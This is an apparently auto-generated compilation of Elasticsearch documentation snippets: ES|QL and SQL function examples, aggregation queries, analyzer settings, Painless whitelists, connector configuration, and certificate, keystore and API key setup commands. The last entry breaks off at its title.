:::{include} ../parameters/st_centroid_agg.md
:::

:::{include} ../description/st_centroid_agg.md
:::

:::{include} ../types/st_centroid_agg.md
:::

:::{include} ../examples/st_centroid_agg.md
:::

----------------------------------------

TITLE: Creating Certificate Authority for Elasticsearch in Bash
DESCRIPTION: This snippet creates a Certificate Authority (CA) using elasticsearch-certutil. It generates a CA certificate and key in PEM format, valid for 9999 days with a 2048-bit key size. The CA is named 'Certificate Authority' with the domain 'localhost'.

LANGUAGE: bash
CODE:
elasticsearch-certutil ca --pem --out ${PWD}/ca.zip -days 9999 -keysize 2048 -ca-dn "CN=Certificate Authority,DC=localhost"
unzip ca.zip
mv ca/ca.* ./
rmdir ca
rm ca.zip

----------------------------------------

TITLE: Basic Pipeline Processor Configuration in Elasticsearch
DESCRIPTION: Basic configuration example of a pipeline processor that executes another pipeline named 'inner-pipeline'.

LANGUAGE: js
CODE:
{
  "pipeline": {
    "name": "inner-pipeline"
  }
}

----------------------------------------

TITLE: Displaying CBRT Function Syntax Diagram in Markdown
DESCRIPTION: This snippet shows how to embed an image of the syntax diagram for the CBRT function in the documentation using Markdown syntax.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/cbrt.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Basic Median Absolute Deviation Query
DESCRIPTION: Example of a basic median absolute deviation aggregation query for product ratings, including an average aggregation for comparison. The rating field must be numeric.

LANGUAGE: console
CODE:
GET reviews/_search
{
  "size": 0,
  "aggs": {
    "review_average": {
      "avg": {
        "field": "rating"
      }
    },
    "review_variability": {
      "median_absolute_deviation": {
        "field": "rating"
      }
    }
  }
}

----------------------------------------

TITLE: Displaying ST_X Function Syntax Diagram in Markdown
DESCRIPTION: This snippet shows how to embed an image of the ST_X function syntax diagram in the documentation using Markdown.

LANGUAGE: markdown
CODE:
:::{image} ../../../images/functions/st_x.svg
:alt: Embedded
:class: text-center
:::

----------------------------------------

TITLE: Querying Elasticsearch with Random Sampler Aggregation
DESCRIPTION: Example of using the random_sampler aggregation in an Elasticsearch query. It samples 10% of documents and calculates percentiles of the taxful_total_price field.

LANGUAGE: console
CODE:
GET kibana_sample_data_ecommerce/_search?size=0&track_total_hits=false
{
  "aggregations": {
    "sampling": {
      "random_sampler": {
        "probability": 0.1
      },
      "aggs": {
        "price_percentiles": {
          "percentiles": {
            "field": "taxful_total_price"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Valid REST API Compatibility Header Values for Elasticsearch 8.x and 9.x
DESCRIPTION: List of valid header values for requesting REST API compatibility when communicating with Elasticsearch 8.x or 9.x servers. These values support different data formats including JSON, YAML, SMILE, and CBOR.

LANGUAGE: text
CODE:
"application/vnd.elasticsearch+json;compatible-with=8"
"application/vnd.elasticsearch+yaml;compatible-with=8"
"application/vnd.elasticsearch+smile;compatible-with=8"
"application/vnd.elasticsearch+cbor;compatible-with=8"

----------------------------------------

TITLE: Debugging Script Query with Debug.explain in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use Debug.explain to investigate the type of 'doc.goals' in a script query. It first indexes a document and then uses the _explain API to run a script that throws an exception with debug information.

LANGUAGE: console
CODE:
PUT /hockey/_doc/1?refresh
{"first":"johnny","last":"gaudreau","goals":[9,27,1],"assists":[17,46,0],"gp":[26,82,1]}

POST /hockey/_explain/1
{
  "query": {
    "script": {
      "script": "Debug.explain(doc.goals)"
    }
  }
}

----------------------------------------

TITLE: Configuring Search Slow Log Settings in Elasticsearch log4j2.properties
DESCRIPTION: This YAML snippet shows how to configure search slow log settings across all indices using the log4j2.properties configuration file in Elasticsearch. It sets thresholds for different log levels and includes user information.

LANGUAGE: yaml
CODE:
index.search.slowlog.threshold.query.warn: 10s
index.search.slowlog.threshold.query.info: 5s
index.search.slowlog.threshold.query.debug: 2s
index.search.slowlog.threshold.query.trace: 500ms

index.search.slowlog.threshold.fetch.warn: 1s
index.search.slowlog.threshold.fetch.info: 800ms
index.search.slowlog.threshold.fetch.debug: 500ms
index.search.slowlog.threshold.fetch.trace: 200ms

index.search.slowlog.include.user: true

----------------------------------------

TITLE: Resetting User Password in Elasticsearch
DESCRIPTION: This example illustrates how to reset the password for a user named 'jachnich' using an interactive prompt for enhanced security.

LANGUAGE: shell
CODE:
bin/elasticsearch-users passwd jachnich

----------------------------------------

TITLE: Generating Box Refresh Token
DESCRIPTION: curl command to generate a refresh token for Box API authentication

LANGUAGE: bash
CODE:
curl -i -X POST "https://api.box.com/oauth2/token" \
     -H "Content-Type: application/x-www-form-urlencoded" \
     -d "client_id=<CLIENT_ID>" \
     -d "client_secret=<CLIENT_SECRET>" \
     -d "code=<AUTHORIZATION_CODE>" \
     -d "grant_type=authorization_code"

----------------------------------------

TITLE: Running Slack Connector Docker Image
DESCRIPTION: This snippet demonstrates how to run the Slack connector Docker image, mounting the configuration file and specifying the network and other parameters.

LANGUAGE: shell
CODE:
docker run \
-v ~/connectors-config:/config \
--network "elastic" \
--tty \
--rm \
docker.elastic.co/integrations/elastic-connectors:9.0.0 \
/app/bin/elastic-ingest \
-c /config/config.yml

----------------------------------------

TITLE: Indexing a Document with Attachment Pipeline in Elasticsearch
DESCRIPTION: Shows how to index a document with a base64-encoded attachment using the attachment processor pipeline.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/my_id?pipeline=attachment
{
  "data": "e1xydGYxXGFuc2kNCkxvcmVtIGlwc3VtIGRvbG9yIHNpdCBhbWV0DQpccGFyIH0="
}

----------------------------------------

TITLE: Defining java.util.regex.Matcher Class for Painless in Elasticsearch
DESCRIPTION: This snippet defines the available methods for the Matcher class in Painless. It includes standard regex matching and manipulation methods, as well as Elasticsearch-specific augmentations. Some methods are intentionally omitted or modified for security and performance reasons.

LANGUAGE: Java
CODE:
class java.util.regex.Matcher {
  int end()
  int end(int)
  boolean find()
  boolean find(int)
  String group()
  String group(int)
  String org.elasticsearch.painless.api.Augmentation namedGroup(String)
  int groupCount()
  boolean hasAnchoringBounds()
  boolean hasTransparentBounds()
  boolean hitEnd()
  boolean lookingAt()
  boolean matches()
  Pattern pattern()
  String quoteReplacement(String)
  Matcher region(int,int)
  int regionEnd()
  int regionStart()
  String replaceAll(String)
  String replaceFirst(String)
  boolean requireEnd()
  Matcher reset()
  int start()
  int start(int)
  Matcher useAnchoringBounds(boolean)
  Matcher usePattern(Pattern)
  Matcher useTransparentBounds(boolean)
}

----------------------------------------

TITLE: Documenting 'field' Parameter for ESQL Function in Markdown
DESCRIPTION: This snippet provides documentation for the 'field' parameter used in an ESQL function. It describes the parameter's purpose and the types of input it can accept.

LANGUAGE: markdown
CODE:
**Parameters**

`field`
:   Input value. The input can be a single- or multi-valued column or an expression.

----------------------------------------

TITLE: Configuring GeoPoint Runtime Field Whitelist for Elasticsearch
DESCRIPTION: This configuration defines the whitelist for GeoPoint-valued runtime fields in Elasticsearch. It includes class imports for GeoPointFieldScript and its Factory, as well as a static import for the emit callback used to collect field values.

LANGUAGE: plaintext
CODE:
# The whitelist for ip-valued runtime fields

# These two whitelists are required for painless to find the classes
class org.elasticsearch.script.GeoPointFieldScript @no_import {
}
class org.elasticsearch.script.GeoPointFieldScript$Factory @no_import {
}

static_import {
    # The `emit` callback to collect values for the field
    void emit(org.elasticsearch.script.GeoPointFieldScript, double, double) bound_to org.elasticsearch.script.GeoPointFieldScript$Emit
}

----------------------------------------

TITLE: Calculating Hyperbolic Sine with SINH Function in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the SINH function in Elasticsearch SQL to calculate the hyperbolic sine of a number. It first creates a row with a numeric value 'a', then uses the SINH function to compute its hyperbolic sine.

LANGUAGE: sql
CODE:
ROW a=1.8
| EVAL sinh=SINH(a)

----------------------------------------

TITLE: Elasticsearch GCE Configuration
DESCRIPTION: YAML configuration for setting up GCE discovery in elasticsearch.yml.

LANGUAGE: yaml
CODE:
cloud:
  gce:
      project_id: es-cloud
      zone: europe-west1-a
discovery:
      seed_providers: gce

----------------------------------------

TITLE: Displaying Supported Types Table in Markdown
DESCRIPTION: This snippet presents a markdown table showing the supported input types 'str' and 'pattern', and their corresponding 'result' type for a specific ESQL function.

LANGUAGE: markdown
CODE:
| str | pattern | result |
| --- | --- | --- |
| keyword | keyword | boolean |
| text | keyword | boolean |

----------------------------------------

TITLE: Creating Multi-Entry JKS Keystore
DESCRIPTION: Creates a Java KeyStore (JKS) with four different signing entries - three using RSA-2048 and one using EC-256 algorithms. Each entry has a unique alias and common name.

LANGUAGE: bash
CODE:
keytool -genkey -alias signing1 -keyalg RSA -keysize 2048 -keystore multi_signing.jks -storepass signing -dname "CN=saml1-test"

keytool -genkey -alias signing2 -keyalg RSA -keysize 2048 -keystore multi_signing.jks -storepass signing -dname "CN=saml2-test"

keytool -genkey -alias signing3 -keyalg RSA -keysize 2048 -keystore multi_signing.jks -storepass signing -dname "CN=saml3-test"

keytool -genkey -alias signing4 -keyalg EC -keysize 256 -keystore multi_signing.jks -storepass signing -dname "CN=saml4-test"

----------------------------------------

TITLE: Custom Path Hierarchy Configuration
DESCRIPTION: Shows how to configure a custom path_hierarchy tokenizer with custom delimiter, replacement character, and skip options.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "my_tokenizer"
        }
      },
      "tokenizer": {
        "my_tokenizer": {
          "type": "path_hierarchy",
          "delimiter": "-",
          "replacement": "/",
          "skip": 2
        }
      }
    }
  }
}

----------------------------------------

TITLE: Describing ATAN Function in Elasticsearch ESQL
DESCRIPTION: This snippet provides a description of the ATAN function in Elasticsearch's ESQL. It explains that the function returns the arctangent of the input numeric expression as an angle, expressed in radians.

LANGUAGE: text
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

**Description**

Returns the [arctangent](https://en.wikipedia.org/wiki/Inverse_trigonometric_functions) of the input numeric expression as an angle, expressed in radians.

----------------------------------------

TITLE: Sorting by Aggregation with LIMIT in Elasticsearch SQL
DESCRIPTION: Shows how to use LIMIT when sorting by aggregation to get the top N results, which is recommended for performance reasons.

LANGUAGE: sql
CODE:
SELECT * FROM test GROUP BY age ORDER BY COUNT(*) LIMIT 100;

----------------------------------------

TITLE: Creating API Key for Microsoft SQL Connector
DESCRIPTION: Example of creating an API key for the Microsoft SQL connector with necessary permissions.

LANGUAGE: json
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Configuring Input and Output Fields
DESCRIPTION: Example showing how to configure the inference processor to read from a content field and write results to content_embedding

LANGUAGE: javascript
CODE:
{
  "inference": {
    "model_id": "model_deployment_for_inference",
    "input_output": [
        {
            "input_field": "content",
            "output_field": "content_embedding"
        }
    ]
  }
}

----------------------------------------

TITLE: Using LOCATE Function in Elasticsearch SQL
DESCRIPTION: Returns the starting position of the first occurrence of a pattern within a source string. An optional start position can be specified.

LANGUAGE: sql
CODE:
SELECT LOCATE('a', 'Elasticsearch');

LOCATE('a', 'Elasticsearch')
----------------------------
3

LANGUAGE: sql
CODE:
SELECT LOCATE('a', 'Elasticsearch', 5);

LOCATE('a', 'Elasticsearch', 5)
-------------------------------
10

----------------------------------------

TITLE: Configuring Azure Blob Storage Connector in YAML
DESCRIPTION: Example YAML configuration for setting up the Azure Blob Storage connector as a self-managed connector. This configuration includes Elasticsearch connection details and connector settings.

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: azure_blob_storage
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA> # Optional. If not provided, the connector will use the elasticsearch.api_key instead

----------------------------------------

TITLE: Using COUNT_DISTINCT in ESQL Query
DESCRIPTION: Demonstrates how to use the COUNT_DISTINCT function in an ESQL query to calculate the approximate number of distinct values for multiple columns.

LANGUAGE: sql
CODE:
FROM hosts
| STATS COUNT_DISTINCT(ip0), COUNT_DISTINCT(ip1)

----------------------------------------

TITLE: Running End-to-End Tests for Microsoft SQL Connector
DESCRIPTION: Commands to run functional tests for the Microsoft SQL connector.

LANGUAGE: shell
CODE:
make ftest NAME=mssql

LANGUAGE: shell
CODE:
make ftest NAME=mssql DATA_SIZE=small

----------------------------------------

TITLE: Creating Password-Protected Elasticsearch Keystore
DESCRIPTION: Creates a new password-protected elasticsearch.keystore file using the create command with password prompt.

LANGUAGE: shell
CODE:
bin/elasticsearch-keystore create -p

----------------------------------------

TITLE: Configuring French Analyzer in Elasticsearch
DESCRIPTION: Example of reimplementing the French analyzer as a custom analyzer in Elasticsearch. It includes elision, stopword removal, stemming, and keyword marking for excluding words from stemming.

LANGUAGE: JSON
CODE:
PUT /french_example
{
  "settings": {
    "analysis": {
      "filter": {
        "french_elision": {
          "type":         "elision",
          "articles_case": true,
          "articles": [
              "l", "m", "t", "qu", "n", "s",
              "j", "d", "c", "jusqu", "quoiqu",
              "lorsqu", "puisqu"
            ]
        },
        "french_stop": {
          "type":       "stop",
          "stopwords":  "_french_"
        },
        "french_keywords": {
          "type":       "keyword_marker",
          "keywords":   ["Example"]
        },
        "french_stemmer": {
          "type":       "stemmer",
          "language":   "light_french"
        }
      },
      "analyzer": {
        "rebuilt_french": {
          "tokenizer":  "standard",
          "filter": [
            "french_elision",
            "lowercase",
            "french_stop",
            "french_keywords",
            "french_stemmer"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Configuring ICU Folding with Swedish Character Exemption
DESCRIPTION: Shows how to configure ICU folding token filter with unicode_set_filter to exempt Swedish characters from folding. Includes lowercase filter since exempted characters retain their case.

LANGUAGE: console
CODE:
PUT icu_sample
{
  "settings": {
    "index": {
      "analysis": {
        "analyzer": {
          "swedish_analyzer": {
            "tokenizer": "icu_tokenizer",
            "filter": [
              "swedish_folding",
              "lowercase"
            ]
          }
        },
        "filter": {
          "swedish_folding": {
            "type": "icu_folding",
            "unicode_set_filter": "[^åäöÅÄÖ]"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Indexing Document with Term Vector Enabled Field
DESCRIPTION: This snippet shows how to index a document into the previously created index. The document contains a 'text' field that will have term vectors stored as configured in the mapping.

LANGUAGE: console
CODE:
PUT my-index-000001/_doc/1
{
  "text": "Quick brown fox"
}

----------------------------------------

TITLE: Including SIGNUM Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various documentation sections for the SIGNUM function using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/signum.md
:::

:::{include} ../description/signum.md
:::

:::{include} ../types/signum.md
:::

:::{include} ../examples/signum.md
:::

----------------------------------------

TITLE: Querying Elasticsearch without Sampler Aggregation
DESCRIPTION: This snippet shows a query on StackOverflow data for 'javascript' or 'kibana' tags without using the Sampler aggregation. It demonstrates how the lack of sampling can lead to less insightful results when using Significant Terms aggregation.

LANGUAGE: console
CODE:
POST /stackoverflow/_search?size=0
{
  "query": {
    "query_string": {
      "query": "tags:kibana OR tags:javascript"
    }
  },
  "aggs": {
    "low_quality_keywords": {
      "significant_terms": {
        "field": "tags",
        "size": 3,
        "exclude": [ "kibana", "javascript" ]
      }
    }
  }
}

----------------------------------------

TITLE: Automated TDVT Test Run using Python Script
DESCRIPTION: Command to run the automated TDVT test suite using a Python script. It clones the TDVT SDK repo, sets up config files, and launches the TDVT run.

LANGUAGE: bash
CODE:
python3 ./tdvt_run.py -u "http://user:pass@elastic-host:9200" -t <taco dir path>

----------------------------------------

TITLE: Subquery with Filter After Group By in SQL for Elasticsearch
DESCRIPTION: Shows a subquery with a GROUP BY clause followed by a WHERE filter in the outer query.

LANGUAGE: sql
CODE:
SELECT j AS k FROM (
    SELECT i AS j FROM (
        SELECT int AS i FROM test
    )
    GROUP BY j
) WHERE j < 5;

----------------------------------------

TITLE: Including TO_LOWER Function Description in Markdown
DESCRIPTION: This snippet includes the description of the TO_LOWER function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../description/to_lower.md
:::

----------------------------------------

TITLE: Calculating Hourly Error Rates
DESCRIPTION: Illustrates using DATE_TRUNC to analyze error rates on an hourly basis. The query identifies errors in messages, groups them by hour, and calculates the average error rate for each hour.

LANGUAGE: esql
CODE:
FROM sample_data
| EVAL error = CASE(message LIKE "*error*", 1, 0)
| EVAL hour = DATE_TRUNC(1 hour, @timestamp)
| STATS error_rate = AVG(error) by hour
| SORT hour

----------------------------------------

TITLE: Oracle SSL Wallet Configuration
DESCRIPTION: Shell commands and configuration for setting up secure SSL connections with Oracle wallet.

LANGUAGE: shell
CODE:
$ mkdir $ORACLE_HOME/ssl_wallet

LANGUAGE: shell
CODE:
WALLET_LOCATION = (SOURCE = (METHOD = FILE) (METHOD_DATA = (DIRECTORY = $ORACLE_HOME/ssl_wallet)))
SSL_CLIENT_AUTHENTICATION = FALSE
SSL_VERSION = 1.0
SSL_CIPHER_SUITES = (SSL_RSA_WITH_AES_256_CBC_SHA)
SSL_SERVER_DN_MATCH = ON

LANGUAGE: shell
CODE:
$ orapki wallet create -wallet path-to-oracle-home/ssl_wallet -auto_login_only
$ orapki wallet add -wallet path-to-oracle-home/ssl_wallet -trusted_cert -cert path-to-oracle-home/ssl_wallet/root_ca.pem -auto_login_only

----------------------------------------

TITLE: Setting Cluster-Wide Total Shards Per Node in Elasticsearch
DESCRIPTION: Configures the maximum number of primary and replica shards allocated to each node across all indices. This is a dynamic cluster setting that defaults to unlimited (-1).

LANGUAGE: yaml
CODE:
cluster.routing.allocation.total_shards_per_node

----------------------------------------

TITLE: API Key Generation Script
DESCRIPTION: Node.js script for generating Elasticsearch API keys that combine multiple user identities and permissions

LANGUAGE: javascript
CODE:
require("dotenv").config();
const axios = require("axios");

const ELASTICSEARCH_URL = process.env.ELASTICSEARCH_URL;
const ELASTICSEARCH_USER = process.env.ELASTICSEARCH_USER;
const ELASTICSEARCH_PASSWORD = process.env.ELASTICSEARCH_PASSWORD;

const config = {
  auth: {
    username: ELASTICSEARCH_USER,
    password: ELASTICSEARCH_PASSWORD,
  },
  headers: {
    "Content-Type": "application/json",
  },
};

async function createApiKey({
  searchApplication,
  userId,
  indices = "",
  metadata,
  expiration = "1d"
}) {
  try {
    const indices = indices.split(",");

    let combinedQuery = { bool: { should: [] } };

    for (const index of indices) {
      const aclsIndex = `.search-acl-filter-${index}`;
      const response = await axios.get(
        `${ELASTICSEARCH_URL}/${aclsIndex}/_doc/${userId}`,
        config
      );
      combinedQuery.bool.should.push({
        bool: {
          must: [
            {
              term: {
                "_index": index,
              },
            },
            response.data._source.query.source,
          ],
        },
      });
    }

    if (!metadata || Object.keys(metadata).length === 0) {
      metadata = { created_by: "create-api-key" };
    }

    const apiKeyBody = {
      name: userId,
      expiration,
      role_descriptors: {
        [`${searchApplication}-role`]: {
          index: [
            {
              names: [searchApplication],
              privileges: ["read"],
              query: combinedQuery,
            },
          ],
          restriction: {
            workflows: ["search_application_query"],
          },
        },
      },
      metadata,
    };

    const apiKeyResponse = await axios.post(
      `${ELASTICSEARCH_URL}/_security/api_key`,
      apiKeyBody,
      config
    );

    console.log(apiKeyResponse.data);
    return apiKeyResponse.data.encoded;
  } catch (error) {
    console.log(error)
  }
}

----------------------------------------

TITLE: Defining JSON Operations Class in Painless
DESCRIPTION: Defines a Java class for JSON operations in Elasticsearch's Painless scripting language. Includes methods for loading JSON from strings and dumping objects to JSON format, with an optional boolean parameter for formatting control.

LANGUAGE: java
CODE:
class org.elasticsearch.painless.api.Json {
  def load(String)
  String dump(def)
  String dump(def, boolean)
}

----------------------------------------

TITLE: Calculating Sine in ESQL
DESCRIPTION: This snippet demonstrates how to use the SIN() function in ESQL to calculate the sine of a given value. It creates a row with a single numeric value and then applies the SIN() function to it.

LANGUAGE: esql
CODE:
ROW a=1.8
| EVAL sin=SIN(a)

----------------------------------------

TITLE: Defining Temporal Interface in Java for Painless
DESCRIPTION: Defines the Temporal interface with methods for manipulating and querying temporal objects. It includes operations for adding, subtracting, and comparing temporal values.

LANGUAGE: java
CODE:
class java.time.temporal.Temporal {
  Temporal minus(long,TemporalUnit)
  Temporal minus(TemporalAmount)
  Temporal plus(long,TemporalUnit)
  Temporal plus(TemporalAmount)
  long until(Temporal,TemporalUnit)
  Temporal with(TemporalAdjuster)
  Temporal with(TemporalField,long)
}

----------------------------------------

TITLE: Specifying REST API Compatibility Headers in JavaScript
DESCRIPTION: Examples of Accept and Content-Type headers used to request REST API compatibility for different media types in Elasticsearch.

LANGUAGE: javascript
CODE:
Accept: "application/vnd.elasticsearch+json;compatible-with=7"

LANGUAGE: javascript
CODE:
Content-Type: "application/vnd.elasticsearch+json;compatible-with=7"

LANGUAGE: javascript
CODE:
"application/vnd.elasticsearch+json;compatible-with=7"
"application/vnd.elasticsearch+yaml;compatible-with=7"
"application/vnd.elasticsearch+smile;compatible-with=7"
"application/vnd.elasticsearch+cbor;compatible-with=7"

----------------------------------------

TITLE: Including SUM Function Documentation Sections in Markdown
DESCRIPTION: This snippet demonstrates how to include various sections of the SUM function documentation using Markdown include directives.

LANGUAGE: markdown
CODE:
:::{include} ../parameters/sum.md
:::

:::{include} ../description/sum.md
:::

:::{include} ../types/sum.md
:::

:::{include} ../examples/sum.md
:::

----------------------------------------

TITLE: Subquery with Field Alias in SQL for Elasticsearch
DESCRIPTION: Shows a subquery where the 'int' field is aliased as 'i' in the inner query and selected in the outer query.

LANGUAGE: sql
CODE:
SELECT i FROM
    (SELECT int AS i FROM test);

----------------------------------------

TITLE: Filtering SHOW FUNCTIONS with Multi-Character Wildcard in Elasticsearch SQL
DESCRIPTION: Example of using the SHOW FUNCTIONS command with a multi-character wildcard to filter functions.

LANGUAGE: sql
CODE:
SHOW FUNCTIONS LIKE 'A%';

     name      |     type
---------------+---------------
AVG            |AGGREGATE
ABS            |SCALAR
ACOS           |SCALAR
ASIN           |SCALAR
ATAN           |SCALAR
ATAN2          |SCALAR
ASCII          |SCALAR

----------------------------------------

TITLE: Including LOG Function Examples in Markdown
DESCRIPTION: This snippet includes examples of using the LOG function from a separate markdown file.

LANGUAGE: markdown
CODE:
:::{include} ../examples/log.md
:::

----------------------------------------

TITLE: Generating API Key for Connector
DESCRIPTION: API call to create a security API key with required permissions for the connector

LANGUAGE: json
CODE:
POST /_security/api_key
{
  "name": "connector_name-connector-api-key",
  "role_descriptors": {
    "connector_name-connector-role": {
      "cluster": [
        "monitor",
        "manage_connector"
      ],
      "indices": [
        {
          "names": [
            "index_name",
            ".search-acl-filter-index_name",
            ".elastic-connectors*"
          ],
          "privileges": [
            "all"
          ],
          "allow_restricted_indices": false
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Creating Elasticsearch Ingest Pipeline with Date Processing Script
DESCRIPTION: Console command to create an ingest pipeline that incorporates the date processing Painless script. The pipeline updates datetime fields for seat documents during ingestion.

LANGUAGE: console
CODE:
PUT /_ingest/pipeline/seats
{
  "description": "update datetime for seats",
  "processors": [
    {
      "script": {
        "source": "String[] dateSplit = ctx.date.splitOnToken('-'); String year = dateSplit[0].trim(); String month = dateSplit[1].trim(); if (month.length() == 1) { month = '0' + month; } String day = dateSplit[2].trim(); if (day.length() == 1) { day = '0' + day; } boolean pm = ctx.time.substring(ctx.time.length() - 2).equals('PM'); String[] timeSplit = ctx.time.substring(0, ctx.time.length() - 2).splitOnToken(':'); int hours = Integer.parseInt(timeSplit[0].trim()); int minutes = Integer.parseInt(timeSplit[1].trim()); if (pm) { hours += 12; } String dts = year + '-' + month + '-' + day + 'T' + (hours < 10 ? '0' + hours : '' + hours) + ':' + (minutes < 10 ? '0' + minutes : '' + minutes) + ':00+08:00'; ZonedDateTime dt = ZonedDateTime.parse(dts, DateTimeFormatter.ISO_OFFSET_DATE_TIME); ctx.datetime = dt.getLong(ChronoField.INSTANT_SECONDS)*1000L;"
      }
    }
  ]
}

----------------------------------------

TITLE: Generating ESQL Function Test Case Comment
DESCRIPTION: This comment provides information about the file's origin and editing instructions. It indicates that the file is generated by ESQL's AbstractFunctionTestCase and should not be edited manually. It also references a README file for regeneration instructions.

LANGUAGE: plaintext
CODE:
% This is generated by ESQL's AbstractFunctionTestCase. Do no edit it. See ../README.md for how to regenerate it.

----------------------------------------

TITLE: Gmail Connector Docker Configuration
DESCRIPTION: Example YAML configuration for deploying the Gmail connector using Docker

LANGUAGE: yaml
CODE:
elasticsearch.host: http://host.docker.internal:9200
elasticsearch.api_key: <ELASTICSEARCH_API_KEY>

connectors:
  -
    connector_id: <CONNECTOR_ID_FROM_KIBANA>
    service_type: gmail
    api_key: <CONNECTOR_API_KEY_FROM_KIBANA>

----------------------------------------

TITLE: Analyzing Text with Shingle Token Filter in Elasticsearch
DESCRIPTION: This example demonstrates how to use the Shingle token filter to add two-word shingles to the token stream for the text 'quick brown fox jumps' using the Elasticsearch Analyze API.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "whitespace",
  "filter": [ "shingle" ],
  "text": "quick brown fox jumps"
}

----------------------------------------

TITLE: Geometry Field Script Class Whitelist Definition
DESCRIPTION: Defines whitelist entries for GeometryFieldScript classes and static imports required for geometry field operations in Elasticsearch painless scripting.

LANGUAGE: plaintext
CODE:
class org.elasticsearch.script.GeometryFieldScript @no_import {
}
class org.elasticsearch.script.GeometryFieldScript$Factory @no_import {
}

static_import {
    # The `emit` callback to collect values for the field
    void emit(org.elasticsearch.script.GeometryFieldScript, Object) bound_to org.elasticsearch.script.GeometryFieldScript$Emit
}

----------------------------------------

TITLE: Creating HDFS Repository in Elasticsearch using REST API
DESCRIPTION: This snippet demonstrates how to create an HDFS repository named 'my_hdfs_repository' using the Elasticsearch REST API. It specifies the HDFS URI, path, and a configuration parameter for short-circuit reads.

LANGUAGE: console
CODE:
PUT _snapshot/my_hdfs_repository
{
  "type": "hdfs",
  "settings": {
    "uri": "hdfs://namenode:8020/",
    "path": "elasticsearch/repositories/my_hdfs_repository",
    "conf.dfs.client.read.shortcircuit": "true"
  }
}

----------------------------------------

TITLE: Including TO_UPPER Function Examples in Markdown
DESCRIPTION: This snippet includes the content of a markdown file containing examples for the TO_UPPER function.

LANGUAGE: markdown
CODE:
:::{include} ../examples/to_upper.md
:::

----------------------------------------

TITLE: Running YAML REST Tests for OpenTelemetry Ingest Plugin
DESCRIPTION: This command executes the YAML REST tests for the OpenTelemetry Ingest plugin. These tests verify the functionality of index templates and ingest pipelines.

LANGUAGE: shell
CODE:
./gradlew :x-pack:plugin:otel-data:yamlRestTest

----------------------------------------

TITLE: SQL Reserved Keyword as Identifier
DESCRIPTION: Example showing how to use reserved keywords as identifiers by quoting them.

LANGUAGE: sql
CODE:
SELECT "from" FROM "<logstash-{now/d}>"

----------------------------------------

TITLE: Using Triple Quotes for Escaping in Elasticsearch ESQL
DESCRIPTION: This snippet illustrates an alternative method of escaping special characters in ESQL using triple quotes. It reduces the need for multiple escape characters, making the query more readable.

LANGUAGE: esql
CODE:
ROW message = "foo ( bar"
| WHERE message RLIKE """foo \( bar"""

----------------------------------------

TITLE: Description - Max Y Coordinate Extraction
DESCRIPTION: Documentation block explaining how to extract the maximum y-coordinate or latitude value from geometric data types. The function works with both geo_point and geo_shape data types in Elasticsearch.

LANGUAGE: markdown
CODE:
**Description**

Extracts the maximum value of the `y` coordinates from the supplied geometry. If the geometry is of type `geo_point` or `geo_shape` this is equivalent to extracting the maximum `latitude` value.

----------------------------------------

TITLE: Unsupported Scalar Function on Nested Fields in ORDER BY Clause
DESCRIPTION: Illustrates an unsupported query using a scalar function on a nested field in the ORDER BY clause.

LANGUAGE: sql
CODE:
SELECT * FROM test_emp ORDER BY YEAR(dep.start_date);

----------------------------------------

TITLE: Setting In-Flight Requests Circuit Breaker in Elasticsearch
DESCRIPTION: YAML configuration for the in-flight requests circuit breaker in Elasticsearch. It includes settings for the limit and overhead.

LANGUAGE: yaml
CODE:
network.breaker.inflight_requests.limit: "100%"
network.breaker.inflight_requests.overhead: 2

----------------------------------------

TITLE: Fixing MySQL Connector Configuration After Upgrade
DESCRIPTION: This snippet provides a script to fix the MySQL connector configuration when upgrading from a tech preview connector (8.7 or earlier) to 8.8.

LANGUAGE: JSON
CODE:
POST /.elastic-connectors/_update/connector_id
{
  "doc" : {
    "configuration": {
      "tables": {
        "type": "list",
        "value": "*"
      },
      "ssl_enabled": {
        "type": "bool",
        "value": false
      },
      "ssl_ca": {
        "type": "str",
        "value": ""
      },
      "fetch_size": {
        "type": "int",
        "value": 50
      },
      "retry_count": {
        "type": "int",
        "value": 3
      }
    }
  }
}

----------------------------------------

TITLE: Advanced Sync Rules for Multiple Tables
DESCRIPTION: JSON configuration for advanced sync rules to query multiple PostgreSQL tables

LANGUAGE: javascript
CODE:
[
  {
    "tables": [
      "employee"
    ],
    "query": "SELECT * FROM employee"
  },
  {
    "tables": [
      "customer"
    ],
    "query": "SELECT * FROM customer"
  }
]

----------------------------------------

TITLE: Converting Strings to Booleans using TO_BOOLEAN in Elasticsearch ESQL
DESCRIPTION: This snippet demonstrates the usage of the TO_BOOLEAN function in Elasticsearch ESQL. It converts an array of string values to their corresponding boolean representations. The function converts 'true' (case-insensitive) to true, '0' to false, and any non-zero number to true. All other inputs, including empty strings, are converted to false.

LANGUAGE: sql
CODE:
ROW str = ["true", "TRuE", "false", "", "yes", "1"]
| EVAL bool = TO_BOOLEAN(str)

----------------------------------------

TITLE: Creating an API Key for Slack Connector
